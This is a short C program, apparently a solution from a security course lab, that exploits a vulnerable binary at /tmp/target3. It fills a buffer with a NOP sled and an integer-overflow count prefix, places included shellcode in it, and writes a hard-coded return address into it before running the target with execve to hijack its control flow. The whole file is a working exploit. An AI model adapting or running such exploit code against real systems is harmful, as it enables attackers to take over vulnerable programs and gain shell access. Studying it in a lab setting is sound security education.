#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{

  char attack_string[1000 * (2 * sizeof(double) + sizeof(int)) + 4 + 11];
  memset(attack_string, '\x90', sizeof(attack_string));

  char *countstring = "2147484649,"; //leng11
  memcpy(attack_string, countstring, strlen(countstring));
  memcpy(attack_string + 40, shellcode, strlen(shellcode));
  *(int *)(attack_string + 20000 + strlen(countstring) + 4) = 0xbfff6214;

  char *args[] = { TARGET, attack_string, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}